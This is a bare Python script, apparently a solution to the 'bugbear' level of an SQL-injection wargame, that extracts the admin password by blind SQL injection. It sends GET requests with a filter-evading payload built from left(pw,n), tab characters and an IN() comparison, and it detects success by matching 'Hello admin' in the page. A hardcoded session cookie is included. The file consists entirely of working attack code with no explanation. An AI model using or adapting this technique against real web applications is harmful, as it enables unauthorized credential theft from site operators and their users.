
import requests

url = "https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php"


def injection(cookie, length):
    cookie_header = {"PHPSESSID": cookie}
    result = ""

    char_list = "qwertyuiopasdfghjklzxcvbnmm1234567890"

    for i in range(1, length + 1):
        for x in char_list:
            
            query = "left(pw,"+str(i)+")%09IN(%09%22"+str(result)+str(x)+"%22)%23"
            request = url + query

            response = requests.get(request, cookies=cookie_header)
            if response.text.find("<h2>Hello admin</h2>") > 0:
                result += x
                print(result)
                break
    return result

if __name__ == '__main__':
    cookie = "75pktsp7qe21ak9j3k46r7t2v7"
    result = injection(cookie, 8)
